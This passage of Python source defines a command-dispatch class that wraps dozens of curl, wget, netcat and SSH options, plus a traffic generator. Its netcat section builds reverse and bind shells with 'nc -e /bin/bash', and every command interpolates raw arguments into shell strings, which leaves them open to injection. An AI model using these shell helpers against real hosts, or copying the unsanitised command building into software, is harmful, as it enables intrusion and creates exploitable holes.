        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        return self._generic(f'curl -s -X OPTIONS {args[0]}')
    
    def _curl_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_output <url> <file>'}
        return self._generic(f'curl -s -o {args[1]} {args[0]}')
    
    def _curl_remote_name(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_remote_name <url>'}
        return self._generic(f'curl -s -O {args[0]}')
    
    def _curl_location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_location <url>'}
        return self._generic(f'curl -s -L {args[0]}')
    
    def _curl_include(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_include <url>'}
        return self._generic(f'curl -s -i {args[0]}')
    
    def _curl_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_verbose <url>'}
        return self._generic(f'curl -v {args[0]}')
    
    def _curl_silent(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_silent <url>'}
        return self._generic(f'curl -s {args[0]}')
    
    def _curl_show_error(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_show_error <url>'}
        return self._generic(f'curl -sS {args[0]}')
    
    def _curl_fail(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_fail <url>'}
        return self._generic(f'curl -sf {args[0]}')
    
    def _curl_insecure(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_insecure <url>'}
        return self._generic(f'curl -sk {args[0]}')
    
    def _curl_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data <url> <data>'}
        return self._generic(f'curl -s -d "{args[1]}" {args[0]}')
    
    def _curl_data_binary(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_binary <url> <file>'}
        return self._generic(f'curl -s --data-binary @{args[1]} {args[0]}')
    
    def _curl_data_urlencode(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_urlencode <url> <data>'}
        return self._generic(f'curl -s --data-urlencode "{args[1]}" {args[0]}')
    
    def _curl_data_raw(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_raw <url> <data>'}
        return self._generic(f'curl -s --data-raw "{args[1]}" {args[0]}')
    
    def _curl_form(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_form <url> <name> <value>'}
        return self._generic(f'curl -s -F "{args[1]}={args[2]}" {args[0]}')
    
    def _curl_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_header <url> <header>'}
        return self._generic(f'curl -s -H "{args[1]}" {args[0]}')
    
    def _curl_user_agent(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user_agent <url> <agent>'}
        return self._generic(f'curl -s -A "{args[1]}" {args[0]}')
    
    def _curl_referer(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_referer <url> <referer>'}
        return self._generic(f'curl -s -e "{args[1]}" {args[0]}')
    
    def _curl_user(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user <url> <user:pass>'}
        return self._generic(f'curl -s -u "{args[1]}" {args[0]}')
    
    def _curl_basic(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_basic <url> <user:pass>'}
        return self._generic(f'curl -s --basic -u "{args[1]}" {args[0]}')
    
    def _curl_digest(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_digest <url> <user:pass>'}
        return self._generic(f'curl -s --digest -u "{args[1]}" {args[0]}')
    
    def _curl_ntlm(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_ntlm <url> <user:pass>'}
        return self._generic(f'curl -s --ntlm -u "{args[1]}" {args[0]}')
    
    def _curl_negotiate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_negotiate <url> <user:pass>'}
        return self._generic(f'curl -s --negotiate -u "{args[1]}" {args[0]}')
    
    def _curl_cookie(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie <url> <cookie>'}
        return self._generic(f'curl -s -b "{args[1]}" {args[0]}')
    
    def _curl_cookie_jar(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie_jar <url> <file>'}
        return self._generic(f'curl -s -c {args[1]} {args[0]}')
    
    def _curl_proxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy <url> <proxy>'}
        return self._generic(f'curl -s -x {args[1]} {args[0]}')
    
    def _curl_proxy_user(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_proxy_user <url> <proxy> <user:pass>'}
        return self._generic(f'curl -s -x {args[1]} --proxy-user "{args[2]}" {args[0]}')
    
    def _curl_noproxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_noproxy <url> <hosts>'}
        return self._generic(f'curl -s --noproxy "{args[1]}" {args[0]}')
    
    def _curl_cert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cert <url> <cert>'}
        return self._generic(f'curl -s -E {args[1]} {args[0]}')
    
    def _curl_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_key <url> <key>'}
        return self._generic(f'curl -s --key {args[1]} {args[0]}')
    
    def _curl_cacert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cacert <url> <ca>'}
        return self._generic(f'curl -s --cacert {args[1]} {args[0]}')
    
    def _curl_ciphers(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_ciphers <url> <ciphers>'}
        return self._generic(f'curl -s --ciphers {args[1]} {args[0]}')
    
    def _curl_tlsv1_2(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_2 <url>'}
        return self._generic(f'curl -s --tlsv1.2 {args[0]}')
    
    def _curl_tlsv1_3(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_3 <url>'}
        return self._generic(f'curl -s --tlsv1.3 {args[0]}')
    
    def _curl_continue_at(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_continue_at <url>'}
        return self._generic(f'curl -s -C - {args[0]}')
    
    def _curl_range(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_range <url> <range>'}
        return self._generic(f'curl -s -r {args[1]} {args[0]}')
    
    def _curl_limit_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_limit_rate <url> <rate>'}
        return self._generic(f'curl -s --limit-rate {args[1]} {args[0]}')
    
    def _curl_max_time(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_max_time <url> <seconds>'}
        return self._generic(f'curl -s -m {args[1]} {args[0]}')
    
    def _curl_connect_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_connect_timeout <url> <seconds>'}
        return self._generic(f'curl -s --connect-timeout {args[1]} {args[0]}')
    
    def _curl_retry(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry <url> <count>'}
        return self._generic(f'curl -s --retry {args[1]} {args[0]}')
    
    def _curl_retry_delay(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry_delay <url> <seconds>'}
        return self._generic(f'curl -s --retry-delay {args[1]} {args[0]}')
    
    def _curl_ipv4(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv4 <url>'}
        return self._generic(f'curl -s -4 {args[0]}')
    
    def _curl_ipv6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv6 <url>'}
        return self._generic(f'curl -s -6 {args[0]}')
    
    def _curl_interface(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_interface <url> <interface>'}
        return self._generic(f'curl -s --interface {args[1]} {args[0]}')
    
    def _curl_http2(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_http2 <url>'}
        return self._generic(f'curl -s --http2 {args[0]}')
    
    def _curl_compressed(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_compressed <url>'}
        return self._generic(f'curl -s --compressed {args[0]}')
    
    def _curl_write_out(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_write_out <url> <format>'}
        return self._generic(f'curl -s -w "{args[1]}" -o /dev/null {args[0]}')
    
    def _curl_dump_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_dump_header <url> <file>'}
        return self._generic(f'curl -s -D {args[1]} {args[0]}')
    
    def _curl_trace(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_trace <url> <file>'}
        return self._generic(f'curl -s --trace {args[1]} {args[0]}')
    
    def _curl_help(self, args: List[str]) -> Dict:
        return self._generic('curl --help')
    
    def _curl_version(self, args: List[str]) -> Dict:
        return self._generic('curl --version')
    
    def _curl_parallel(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_parallel <url1> <url2>'}
        return self._generic(f'curl -s -Z "{args[0]}" "{args[1]}"')
    
    def _curl_json(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_json <url> <json>'}
        return self._generic(f'curl -s --json "{args[1]}" {args[0]}')
    
    def _curl_socks5(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks5 <url> <proxy>'}
        return self._generic(f'curl -s --socks5 {args[1]} {args[0]}')
    
    def _curl_upload(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_upload <url> <file>'}
        return self._generic(f'curl -s -T {args[1]} {args[0]}')
    
    def _curl_ftp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ftp <ftp_url>'}
        return self._generic(f'curl -s {args[0]}')
    
    # ==================== Wget Commands ====================
    def _wget(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget <url>'}
        result = self.tools.wget(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output <url> <file>'}
        return self._generic(f'wget -O {args[1]} {args[0]}')
    
    def _wget_continue(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_continue <url>'}
        return self._generic(f'wget -c {args[0]}')
    
    def _wget_background(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_background <url>'}
        return self._generic(f'wget -b {args[0]}')
    
    def _wget_quiet(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_quiet <url>'}
        return self._generic(f'wget -q {args[0]}')
    
    def _wget_recursive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        return self._generic(f'wget -r {args[0]}')
    
    def _wget_mirror(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_mirror <url>'}
        return self._generic(f'wget -m {args[0]}')
    
    def _wget_spider(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_spider <url>'}
        return self._generic(f'wget --spider {args[0]}')
    
    def _wget_input(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_input <file>'}
        return self._generic(f'wget -i {args[0]}')
    
    def _wget_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_header <url> <header>'}
        return self._generic(f'wget --header="{args[1]}" {args[0]}')
    
    def _wget_user_agent(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user_agent <url> <agent>'}
        return self._generic(f'wget --user-agent="{args[1]}" {args[0]}')
    
    def _wget_referer(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_referer <url> <referer>'}
        return self._generic(f'wget --referer={args[1]} {args[0]}')
    
    def _wget_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cookies <url> <file>'}
        return self._generic(f'wget --load-cookies={args[1]} {args[0]}')
    
    def _wget_save_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_save_cookies <url> <file>'}
        return self._generic(f'wget --save-cookies={args[1]} {args[0]}')
    
    def _wget_limit_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_limit_rate <url> <rate>'}
        return self._generic(f'wget --limit-rate={args[1]} {args[0]}')
    
    def _wget_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_timeout <url> <seconds>'}
        return self._generic(f'wget --timeout={args[1]} {args[0]}')
    
    def _wget_tries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_tries <url> <count>'}
        return self._generic(f'wget --tries={args[1]} {args[0]}')
    
    def _wget_retry(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_retry <url>'}
        return self._generic(f'wget --retry-connrefused {args[0]}')
    
    def _wget_no_check_cert(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_check_cert <url>'}
        return self._generic(f'wget --no-check-certificate {args[0]}')
    
    def _wget_certificate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_certificate <url> <cert>'}
        return self._generic(f'wget --certificate={args[1]} {args[0]}')
    
    def _wget_private_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_private_key <url> <key>'}
        return self._generic(f'wget --private-key={args[1]} {args[0]}')
    
    def _wget_ca_certificate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_ca_certificate <url> <ca>'}
        return self._generic(f'wget --ca-certificate={args[1]} {args[0]}')
    
    def _wget_proxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_proxy <url> <proxy>'}
        return self._generic(f'wget -e use_proxy=yes -e http_proxy={args[1]} {args[0]}')
    
    def _wget_no_proxy(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_proxy <url>'}
        return self._generic(f'wget --no-proxy {args[0]}')
    
    def _wget_user(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user <url> <user>'}
        return self._generic(f'wget --user={args[1]} {args[0]}')
    
    def _wget_password(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_password <url> <pass>'}
        return self._generic(f'wget --password={args[1]} {args[0]}')
    
    def _wget_post_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_data <url> <data>'}
        return self._generic(f'wget --post-data="{args[1]}" {args[0]}')
    
    def _wget_post_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_file <url> <file>'}
        return self._generic(f'wget --post-file={args[1]} {args[0]}')
    
    def _wget_method(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_method <url> <method>'}
        return self._generic(f'wget --method={args[1]} {args[0]}')
    
    def _wget_timestamping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_timestamping <url>'}
        return self._generic(f'wget -N {args[0]}')
    
    def _wget_no_clobber(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_clobber <url>'}
        return self._generic(f'wget -nc {args[0]}')
    
    def _wget_delete_after(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_delete_after <url>'}
        return self._generic(f'wget --delete-after {args[0]}')
    
    def _wget_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_progress <url>'}
        return self._generic(f'wget --progress=bar {args[0]}')
    
    def _wget_show_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_show_progress <url>'}
        return self._generic(f'wget --show-progress {args[0]}')
    
    def _wget_config(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_config <file>'}
        return self._generic(f'wget --config={args[0]}')
    
    def _wget_append_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_append_output <url> <file>'}
        return self._generic(f'wget -a {args[1]} {args[0]}')
    
    def _wget_output_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output_file <url> <file>'}
        return self._generic(f'wget -o {args[1]} {args[0]}')
    
    def _wget_no_parent(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_parent <url>'}
        return self._generic(f'wget -np {args[0]}')
    
    def _wget_cut_dirs(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cut_dirs <url> <count>'}
        return self._generic(f'wget --cut-dirs={args[1]} {args[0]}')
    
    def _wget_directory_prefix(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_directory_prefix <url> <dir>'}
        return self._generic(f'wget -P {args[1]} {args[0]}')
    
    def _wget_convert_links(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_convert_links <url>'}
        return self._generic(f'wget -k {args[0]}')
    
    def _wget_backup_converted(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_backup_converted <url>'}
        return self._generic(f'wget -K {args[0]}')
    
    def _wget_adjust_extension(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_adjust_extension <url>'}
        return self._generic(f'wget -E {args[0]}')
    
    def _wget_restrict_file_names(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_restrict_file_names <url>'}
        return self._generic(f'wget --restrict-file-names=unix {args[0]}')
    
    def _wget_trust_server_names(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_trust_server_names <url>'}
        return self._generic(f'wget --trust-server-names {args[0]}')
    
    def _wget_content_disposition(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_content_disposition <url>'}
        return self._generic(f'wget --content-disposition {args[0]}')
    
    def _wget_random_wait(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_random_wait <url>'}
        return self._generic(f'wget --random-wait {args[0]}')
    
    def _wget_wait(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_wait <url> <seconds>'}
        return self._generic(f'wget -w {args[1]} {args[0]}')
    
    def _wget_waitretry(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_waitretry <url> <seconds>'}
        return self._generic(f'wget --waitretry={args[1]} {args[0]}')
    
    def _wget_quota(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_quota <url> <quota>'}
        return self._generic(f'wget -Q {args[1]} {args[0]}')
    
    def _wget_dns_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_dns_timeout <url> <seconds>'}
        return self._generic(f'wget --dns-timeout={args[1]} {args[0]}')
    
    def _wget_connect_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_connect_timeout <url> <seconds>'}
        return self._generic(f'wget --connect-timeout={args[1]} {args[0]}')
    
    def _wget_read_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_read_timeout <url> <seconds>'}
        return self._generic(f'wget --read-timeout={args[1]} {args[0]}')
    
    def _wget_inet4(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet4 <url>'}
        return self._generic(f'wget -4 {args[0]}')
    
    def _wget_inet6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet6 <url>'}
        return self._generic(f'wget -6 {args[0]}')
    
    def _wget_prefer_family(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_prefer_family <url> <family>'}
        return self._generic(f'wget --prefer-family={args[1]} {args[0]}')
    
    def _wget_bind_address(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_bind_address <url> <ip>'}
        return self._generic(f'wget --bind-address={args[1]} {args[0]}')
    
    def _wget_no_dns_cache(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_dns_cache <url>'}
        return self._generic(f'wget --no-dns-cache {args[0]}')
    
    def _wget_no_http_keep_alive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_http_keep_alive <url>'}
        return self._generic(f'wget --no-http-keep-alive {args[0]}')
    
    def _wget_no_cache(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cache <url>'}
        return self._generic(f'wget --no-cache {args[0]}')
    
    def _wget_no_cookies(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cookies <url>'}
        return self._generic(f'wget --no-cookies {args[0]}')
    
    def _wget_load_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_load_cookies <url> <file>'}
        return self._generic(f'wget --load-cookies={args[1]} {args[0]}')
    
    def _wget_keep_session_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_keep_session_cookies <url> <file>'}
        return self._generic(f'wget --keep-session-cookies --save-cookies={args[1]} {args[0]}')
    
    def _wget_help(self, args: List[str]) -> Dict:
        return self._generic('wget --help')
    
    def _wget_version(self, args: List[str]) -> Dict:
        return self._generic('wget --version')
    
    # ==================== Netcat Commands ====================
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port>'}
        result = self.tools.netcat(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _nc_listen(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nc_listen <port>'}
        return self._generic(f'nc -lvp {args[0]}')
    
    def _nc_scan(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_scan <host> <ports>'}
        return self._generic(f'nc -zv {args[0]} {args[1]}')
    
    def _nc_transfer(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_transfer <host> <port> <file>'}
        return self._generic(f'nc {args[0]} {args[1]} < {args[2]}')
    
    def _nc_shell(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_shell <host> <port>'}
        return self._generic(f'nc {args[0]} {args[1]} -e /bin/bash')
    
    def _nc_reverse(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_reverse <host> <port>'}
        return self._generic(f'nc -e /bin/bash {args[0]} {args[1]}')
    
    def _nc_banner(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_banner <host> <port>'}
        return self._generic(f'echo "" | nc -v {args[0]} {args[1]}')
    
    def _nc_port_scan(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_port_scan <host> <start_port> <end_port>'}
        return self._generic(f'nc -zv {args[0]} {args[1]}-{args[2]}')
    
    def _nc_udp(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_udp <host> <port>'}
        return self._generic(f'nc -u {args[0]} {args[1]}')
    
    def _nc_hex(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_hex <host> <port>'}
        return self._generic(f'nc -x {args[0]} {args[1]}')
    
    def _nc_verbose(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_verbose <host> <port>'}
        return self._generic(f'nc -v {args[0]} {args[1]}')
    
    def _nc_zero_io(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_zero_io <host> <port>'}
        return self._generic(f'nc -zv -w 1 {args[0]} {args[1]}')
    
    def _nc_exec(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_exec <host> <port> <command>'}
        return self._generic(f'echo "{args[2]}" | nc {args[0]} {args[1]}')
    
    def _nc_proxy(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_proxy <host> <port> <proxy>'}
        return self._generic(f'nc -x {args[2]} {args[0]} {args[1]}')
    
    def _nc_ssl(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_ssl <host> <port>'}
        return self._generic(f'ncat --ssl {args[0]} {args[1]}')
    
    def _nc_keep_open(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_keep_open <host> <port>'}
        return self._generic(f'nc -k -l {args[0]} {args[1]}')
    
    def _nc_source_port(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_source_port <host> <port> <source_port>'}
        return self._generic(f'nc -p {args[2]} {args[0]} {args[1]}')
    
    def _nc_timeout(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_timeout <host> <port> <seconds>'}
        return self._generic(f'nc -w {args[2]} {args[0]} {args[1]}')
    
    def _nc_wait(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_wait <host> <port> <seconds>'}
        return self._generic(f'nc -w {args[2]} -l {args[0]} {args[1]}')
    
    # ==================== SSH Commands ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        if self.ssh.connect(args[0]):
            return {'success': True, 'output': f"Connected to {args[0]}"}
        return {'success': False, 'output': f"Failed to connect to {args[0]}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        result = self.ssh.execute_command(args[0], ' '.join(args[1:]))
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
        self.ssh.disconnect(args[0])
        return {'success': True, 'output': f"Disconnected from {args[0]}"}
    
    # ==================== Traffic Generation ====================
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        try:
            generator = self.traffic.generate(args[0], args[1], duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {args[0]} traffic to {args[1]} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
